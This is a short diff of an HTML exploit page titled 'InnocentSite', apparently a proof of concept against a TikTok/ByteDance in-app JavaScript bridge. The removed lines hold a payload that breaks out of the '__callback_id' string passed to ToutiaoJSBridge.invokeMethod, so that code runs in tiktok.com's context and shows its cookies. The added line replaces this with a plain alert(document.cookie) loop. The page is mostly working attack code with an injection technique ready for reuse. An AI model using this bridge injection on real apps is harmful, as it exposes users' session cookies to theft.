@@ -5,19 +5,11 @@
     <title>InnocentSite...</title>
     
     <script>
-      var payload = `
-              setTimeout(function () {
-                if (!window.called && location.href.includes("tiktok.com")) {
-                  alert("Show me your cookie:\\n" + document.cookie);
-                  window.called = true;
-                }
-              }, 1000)
-              `;
       
       function exp() {
         setTimeout(function () {
           for (var i=0; i<1024; i++) {
-            ToutiaoJSBridge.invokeMethod(JSON.stringify({'__callback_id': '" + ' + payload + '+"'}))
+            alert(document.cookie);
           }
         }, 0)
         
